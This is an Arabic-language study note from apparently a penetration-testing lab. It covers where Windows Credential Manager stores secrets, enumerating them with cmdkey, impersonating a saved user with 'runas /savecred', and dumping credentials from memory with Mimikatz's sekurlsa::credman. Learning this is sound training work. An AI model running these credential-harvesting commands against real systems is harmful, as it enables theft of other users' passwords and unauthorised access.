## Windows Vault and Credential Manager
- الCredential Manager دي عامله زي الخزنة اللي فيها كل الباسوردات عشان مش كل شوية اليوزر هيكتب الباسورد
- الCredentials دي بتكون متخزنه في special encrypted folders علي الكمبيوتر
-`%UserProfile%\AppData\Local\Microsoft\Vault\`
-`%UserProfile%\AppData\Local\Microsoft\Credentials\`
-`%UserProfile%\AppData\Roaming\Microsoft\Vault\`
-`%ProgramData%\Microsoft\Vault\`
-`%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`
- كل vault folder من دول بيحتوي علي `policy.vpol` متشفر بAES
- الAES keys دي بتستخدم عشان تشفر الcreds
- الإصدارات الجديده من الويندوز بتستخدم Credential Guard عشان تأمن اكتر الDPAPI master key
- البيانات دي فعليا بتتخزن فعليا في مخازن امنه اسمها Credential Lockeras يعني مثلا الCreds Manager زي الواجهة اللي بتدير الصناديق وCreds Lockers هما الصناديق الحقيقيه اللي البيانات بتتقفل فيها

| Name                | Description                                                                                                                                                           |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Web Credentials     | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.                             |
| Windows Credentials | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |
- ممكن نعمل export للwindows vault اللي بتكون `crd.` وتاخد منها backup وده ممكن يتعمل من Control Panel او CMD
**
```cmd-session
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```

![](Pasted%20image%2020260207231250.png)

----
## Enumerating credentials with cmdkey
- ممكن نستخدم cmdkey عشان نenumerate الcreds

```cmd-session
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Stored credentials are listed with the following format:

| Key         | Value                                                                                                                                                      |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Target      | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.                                        |
| Type        | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.                                  |
| User        | The user account associated with the credential.                                                                                                           |
| Persistence | Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots. |
- اول credential هنلاقيها فوق هيا `virtualapp/didlogical` ده credential عام بيضيف الويندوز لما بيتعامل مع خدمات microsoft live
- تاني credential هيا `Domain:interactive=SRV01\mcharles` دهdomain credential يعني دي بيانات دخول مرتبطة بدومين مش حاجه local علي الجهاز والSRV01 ده اسم الدومين او الdomain controller و mcharles ده اسم اليوزر
- هنلاقي فالنتيجه اللي فوق كلمة `interactive` ودي credential بتستخدم للinteractive logon sessions لو لقيت نوع زي ده متخزن تقدر تستخدم اداة اسمها runas عشان تشغل البرنامج ده بهوية المستخدم ده بدل هويتك

```cmd-session
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```
![](Pasted%20image%2020260207232020.png)

----
## Extracting credentials with Mimikatz
- في tools كتير عشان تقدر تdecrypt الstored creds واحدة من الأدوات دي هيا `mimikatz` 
- ممكن نdump creds من ميموري باستخدام موديول `sekurlsa` جوه mimikatz او بشكل manually باستخدام `dpapi`

```cmd-session
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```
---
